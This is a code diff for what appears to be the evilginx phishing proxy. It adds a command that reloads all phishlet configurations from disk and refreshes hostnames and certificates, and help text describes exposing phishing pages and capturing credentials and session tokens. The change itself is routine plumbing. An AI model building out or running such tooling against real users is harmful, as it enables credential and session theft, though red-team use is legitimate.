@@ -865,10 +865,42 @@ func (t *Terminal) handlePhishlets(args []string) error {
 		t.output("%s", t.sprintPhishletStatus(""))
 		return nil
 	} else if pn == 1 {
-		_, err := t.cfg.GetPhishlet(args[0])
-		if err == nil {
-			t.output("%s", t.sprintPhishletStatus(args[0]))
+		switch args[0] {
+		case "refresh":
+			reloadedEnabled := false
+			for _, name := range t.cfg.GetPhishletNames() {
+				pl, err := t.cfg.GetPhishlet(name)
+				if err != nil {
+					continue
+				}
+				if pl.ParentName != "" {
+					continue
+				}
+				newPl, err := NewPhishlet(name, pl.Path, nil, t.cfg)
+				if err != nil {
+					log.Error("refresh: failed to reload '%s': %v", name, err)
+					continue
+				}
+				if err := t.cfg.ReloadPhishlet(name, newPl); err != nil {
+					log.Error("refresh: %v", err)
+					continue
+				}
+				if t.cfg.IsSiteEnabled(name) {
+					reloadedEnabled = true
+				}
+				log.Info("phishlet '%s' refreshed", name)
+			}
+			if reloadedEnabled {
+				t.cfg.refreshActiveHostnames()
+				t.manageCertificates(true)
+			}
 			return nil
+		default:
+			_, err := t.cfg.GetPhishlet(args[0])
+			if err == nil {
+				t.output("%s", t.sprintPhishletStatus(args[0]))
+				return nil
+			}
 		}
 	} else if pn == 2 {
 		switch args[0] {
@@ -1788,6 +1820,7 @@ func (t *Terminal) createHelp() {
 			readline.PcItem("disable", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("hide", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("unhide", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-hosts", readline.PcItemDynamic(t.phishletPrefixCompleter)),
 			readline.PcItem("reload", readline.PcItemDynamic(t.phishletPrefixCompleter)),
+			readline.PcItem("refresh"),
 			readline.PcItem("unauth_url", readline.PcItemDynamic(t.phishletPrefixCompleter))))
 	h.AddSubCommand("phishlets", nil, "", "show status of all available phishlets")
 	h.AddSubCommand("phishlets", nil, "<phishlet>", "show details of a specific phishlets")
@@ -1801,6 +1834,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
 	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
 	h.AddSubCommand("phishlets", []string{"reload"}, "reload <phishlet>", "reload phishlet YAML from disk without restarting evilginx")
+	h.AddSubCommand("phishlets", []string{"refresh"}, "refresh", "reload all phishlet YAMLs from disk without restarting evilginx")
 
 	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
 		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
